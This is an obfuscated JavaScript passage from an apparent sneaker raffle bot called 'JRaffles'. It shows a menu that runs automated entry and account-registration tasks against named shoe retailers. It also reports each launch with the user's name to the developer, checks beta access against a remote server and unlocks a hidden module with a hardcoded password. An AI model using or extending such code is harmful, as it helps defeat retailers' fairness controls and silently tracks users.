                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x3919f0
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x5696e3
                    }
                ]
            }];
            const _0x36be6b = { 'embeds': _0x22e18a };
            var _0x4e591e = await _0x3aa619(null, null, 'open', ![]);
            const _0x40e5b4 = { 'openDEVMSG': { 'embeds': [_0x4e591e] } };
            await _0x471d59(_0x1ed0fd, _0x40e5b4['openDEVMSG']);
            async function _0x8fd1f0() {
                _0xd208b3('JRaffles\x20' + _0x5696e3), console['clear'](), console['log']('Hello\x20' + _0x1b5f76['cyan']('' + _0x3919f0) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x5696e3), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x5d0fa2 = 0x0; _0x5d0fa2 < _0x41677c['length'] - 0x4; _0x5d0fa2++) {
                    if (_0x5d0fa2 >= 0xa) {
                        console['log']('\x20(' + _0x5d0fa2 + ')\x20[' + _0x41677c[_0x5d0fa2]['name'] + ']');
                        continue;
                    }
                    if (_0x41677c[_0x5d0fa2]['name'] === 'Reload\x20Settings' || _0x41677c[_0x5d0fa2]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x5d0fa2 + ')\x20\x20[' + _0x41677c[_0x5d0fa2]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x41677c['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x41677c['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x41677c['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x41677c['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x143736();
                if (taskModule > _0x41677c['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x1d2efb(0x3e8), _0x8fd1f0();
                if (_0x41677c[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                    var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x41b651 = await _0x296f9f();
                            await _0x4b7e91['function'](_0x4b7e91, _0x41b651);
                        }
                        if (taskFunction == 0x2) {
                            var _0x41b651 = await _0x296f9f(), _0x41059c = await _0x4f109d(_0x4b7e91);
                            _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x41059c), await _0x4b7e91['function'](_0x4b7e91, _0x41059c, _0x41b651);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x41b651 = await _0x296f9f(), _0x41059c = await _0x4f109d(_0x4b7e91);
                                _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x41059c), await _0x4b7e91['function'](_0x4b7e91, _0x41059c, _0x41b651);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x41b651 = await _0x296f9f();
                                    await _0x4b7e91['function'](_0x4b7e91, _0x41b651);
                                }
                            }
                        }
                    } catch (_0x18b901) {
                        console['log'](_0x18b901), await _0x1d2efb(0x7d0);
                    }
                    return _0x8fd1f0();
                }
                if (_0x41677c[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                        var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x41b651 = await _0x296f9f(), _0x50cf15 = await _0x4f109d(_0x4b7e91);
                            _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x50cf15), await _0x4b7e91['function'](_0x4b7e91, _0x50cf15, _0x41b651);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x41b651 = await _0x296f9f(), _0x50cf15 = await _0x4f109d(_0x4b7e91);
                                _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x50cf15), await _0x4b7e91['function'](_0x4b7e91, _0x50cf15, _0x41b651);
                            }
                        }
                    } catch (_0x4a5251) {
                        console['log'](_0x4a5251), await _0x1d2efb(0xfa0);
                    }
                    return _0x8fd1f0();
                }
                if (_0x41677c[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                        var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x41b651 = await _0x296f9f(), _0x50cf15 = await _0x4f109d(_0x4b7e91);
                            _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x50cf15), await _0x4b7e91['function'](_0x4b7e91, _0x50cf15, _0x41b651);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x41b651 = await _0x296f9f(), _0x50cf15 = await _0x4f109d(_0x4b7e91);
                                _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x50cf15), await _0x4b7e91['function'](_0x4b7e91, _0x50cf15, _0x41b651);
                            }
                        }
                    } catch (_0x535efc) {
                        console['log'](_0x535efc), await _0x1d2efb(0xfa0);
                    }
                    return _0x8fd1f0();
                }
                if (_0x41677c[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                    var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x41b651 = await _0x296f9f();
                        return await _0x4b7e91['function'](_0x4b7e91, _0x41b651), _0x8fd1f0();
                    }
                    var _0x41b651 = await _0x296f9f(), _0x23386e = await _0x4f109d(_0x4b7e91);
                    return _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x23386e), await _0x4b7e91['function'](_0x4b7e91, _0x23386e, _0x41b651), _0x8fd1f0();
                }
                if (_0x41677c[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                    var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x41b651 = await _0x296f9f(), _0x23386e = await _0x4f109d(_0x4b7e91);
                    return _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x23386e), await _0x4b7e91['function'](_0x4b7e91, _0x23386e, _0x41b651), _0x8fd1f0();
                }
                if (_0x41677c[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                    var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x41b651 = await _0x296f9f(), _0x23386e = await _0x4f109d(_0x4b7e91);
                    return _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x23386e), await _0x4b7e91['function'](_0x4b7e91, _0x23386e, _0x41b651), _0x8fd1f0();
                }
                if (_0x41677c[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                    var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x41b651 = await _0x296f9f(), _0x23386e = await _0x4f109d(_0x4b7e91);
                    return _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x23386e), await _0x4b7e91['function'](_0x4b7e91, _0x23386e, _0x41b651), _0x8fd1f0();
                } else {
                    if (_0x41677c[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                        var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x41b651 = await _0x296f9f(), _0x13a90d = await _0x4f109d(_0x4b7e91);
                            return _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x13a90d), await _0x4b7e91['function'](_0x4b7e91, _0x13a90d, _0x41b651), _0x8fd1f0();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x41b651 = await _0x296f9f();
                                return await _0x4b7e91['function'](_0x4b7e91, null, _0x41b651), _0x8fd1f0();
                            }
                        }
                        ;
                    } else {
                        if (_0x41677c[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                            var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction], _0x41b651 = await _0x296f9f(), _0x27bc22 = await _0x4f109d(_0x4b7e91);
                            return _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x27bc22), await _0x4b7e91['function'](_0x4b7e91, _0x27bc22, _0x41b651), await _0x1d2efb(0x1388), _0x8fd1f0();
                        } else {
                            if (_0x41677c[taskModule]['name'] == 'Google\x20Forms') {
                                try {
                                    let _0x474b87 = { 'headers': { 'content-type': 'application/json' } }, _0x20149e = { 'key': _0x1b3d49 }, _0x65fb98 = await _0x2c145d['post']('https://jraffles.herokuapp.com/beta', _0x20149e, _0x474b87);
                                    if (_0x65fb98['status'] != 0xc8)
                                        throw new Error('No\x20Beta\x20Access..');
                                    console['log']('Hello,\x20' + _0x1b5f76['cyan'](_0x3919f0) + '.\x20Beta\x20Access\x20Granted.'), await _0x1d2efb(0x3e8);
                                } catch (_0x292bf8) {
                                    return console['log']('No\x20Beta\x20Access.'), await _0x1d2efb(0x7d0), _0x8fd1f0();
                                }
                                taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                                var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction], _0x41b651 = await _0x296f9f(), _0x27bc22 = await _0x4f109d(_0x4b7e91);
                                return _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x27bc22), await _0x4b7e91['function'](_0x4b7e91, _0x27bc22, _0x41b651), await _0x1d2efb(0x1388), _0x8fd1f0();
                            } else {
                                if (_0x41677c[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                                    var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x41b651 = await _0x296f9f(), _0x13a90d = await _0x4f109d(_0x4b7e91);
                                        return _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x13a90d), await _0x4b7e91['function'](_0x4b7e91, _0x13a90d, _0x41b651), _0x8fd1f0();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x41b651 = await _0x296f9f();
                                            return await _0x4b7e91['function'](_0x4b7e91, null, _0x41b651), _0x8fd1f0();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x41677c[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                                        var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x4b7e91);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x41677c[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                                            var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x41b651 = await _0x296f9f(), _0x31d6fb = await _0x4f109d(_0x4b7e91);
                                                return _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x31d6fb), await _0x4b7e91['function'](_0x4b7e91, _0x31d6fb, _0x41b651), _0x8fd1f0();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x41b651 = await _0x296f9f(), _0x31d6fb = await _0x4f109d(_0x4b7e91);
                                                    return _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x31d6fb), await _0x4b7e91['function'](_0x4b7e91, _0x31d6fb, _0x41b651), _0x8fd1f0();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x41677c[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                                                var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x41b651 = await _0x296f9f(), _0x5b7864 = await _0x4f109d(_0x4b7e91);
                                                    return _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x5b7864), await _0x4b7e91['function'](_0x4b7e91, _0x5b7864, _0x41b651), _0x8fd1f0();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x41b651 = await _0x296f9f(), _0x5b7864 = await _0x4f109d(_0x4b7e91);
                                                        return _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x5b7864), await _0x4b7e91['function'](_0x4b7e91, _0x5b7864, _0x41b651), _0x8fd1f0();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x41677c[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                                                    var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x41b651 = await _0x296f9f(), _0xbf3037 = await _0x4f109d(_0x4b7e91);
                                                        return _0x6a12f3['shuffleTasks'] && await _0x12a271(_0xbf3037), await _0x4b7e91['function'](_0x4b7e91, _0xbf3037, _0x41b651), _0x8fd1f0();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x41b651 = await _0x296f9f(), _0xbf3037 = await _0x4f109d(_0x4b7e91);
                                                            return _0x6a12f3['shuffleTasks'] && await _0x12a271(_0xbf3037), await _0x4b7e91['function'](_0x4b7e91, _0xbf3037, _0x41b651), _0x8fd1f0();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x41677c[taskModule]['name'] == 'JD') {
                                                        taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                                                        var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x41b651 = await _0x296f9f(), _0x55a4ab = await _0x4f109d(_0x4b7e91);
                                                            return _0x6a12f3['shuffleTasks'] && await _0x12a271(_0x55a4ab), await _0x4b7e91['function'](_0x4b7e91, _0x55a4ab, _0x41b651), _0x8fd1f0();
                                                        }
                                                    } else {
                                                        if (_0x41677c[taskModule]['name'] == 'Seven\x20Store')
                                                            return console['log']('returning\x20to\x20menu'), await _0x1d2efb(0x3e8), _0x8fd1f0();
                                                        else {
                                                            if (_0x41677c[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                var _0x51b927 = _0x41677c[taskModule]['name'], _0x41b651 = await _0x296f9f();
                                                                return await _0xabbb2a(_0x51b927, _0x41b651), _0x8fd1f0();
                                                            } else {
                                                                if (_0x41677c[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                    taskFunction = await _0x5dd041(_0x41677c[taskModule]['modules']);
                                                                    var _0x4b7e91 = _0x41677c[taskModule]['modules'][taskFunction];
                                                                    return await _0x4b7e91['function'](_0x4b7e91), _0x8fd1f0();
                                                                } else {
                                                                    if (_0x41677c[taskModule]['name'] == 'Change\x20Settings') {
                                                                        console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                        var _0x10e8c4 = 0x0;
                                                                        for (const _0x146e8c in _0x6a12f3) {
                                                                            console['log']('(' + _0x10e8c4 + ')\x20' + _0x146e8c + '\x20:\x20' + _0x6a12f3[_0x146e8c]), _0x10e8c4++;
                                                                        }
                                                                        console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x10e8c4 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                        var _0x358463 = await _0x151711();
                                                                        if (_0x358463 == _0x10e8c4)
                                                                            return _0x8fd1f0();
                                                                        console['clear'];
                                                                        var _0x58041f = 0x0;
                                                                        for (var _0x3db76a in _0x6a12f3) {
                                                                            if (_0x358463 == _0x58041f) {
                                                                                console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x3db76a + '\x20:'), _0x6a12f3[_0x3db76a] = await _0x382d78(), _0x3601e1['writeFileSync']('../settings.json', JSON['stringify'](_0x6a12f3));
                                                                                break;
                                                                            } else
                                                                                _0x58041f++;
                                                                        }
                                                                        return console['log']('Settings\x20Saved!'), await _0x1d2efb(0xbb8), _0x8fd1f0();
                                                                    } else {
                                                                        if (_0x41677c[taskModule]['name'] == 'Reload\x20Settings')
                                                                            return console['log']('Reloading\x20settings'), await _0x19146c(), _0x8fd1f0();
                                                                        else {
                                                                            if (taskModule == 0x45) {
                                                                                _0x41677c[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                var _0x2f965e = await _0x5cd8c3();
                                                                                _0x2f965e == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x2d13ff(), await afewFunction(_0x395848[_0x421a63], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x1d2efb(0xbb8));
                                                                            } else {
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x8fd1f0();
            } catch (_0x1e04d3) {
                return console['log'](_0x1e04d3), await _0x1d2efb(0x2710), _0x8fd1f0();
            }
        } catch (_0x51dfa3) {
            return console['log'](_0x51dfa3), await _0x1d2efb(0x3a98);
        }
}
;
_0xd208b3('JRaffles\x20' + _0x5696e3);
try {
    _0x19146c(), _0x49cb0e();
} catch (_0x1583ec) {
    console['log'](_0x1583ec);
}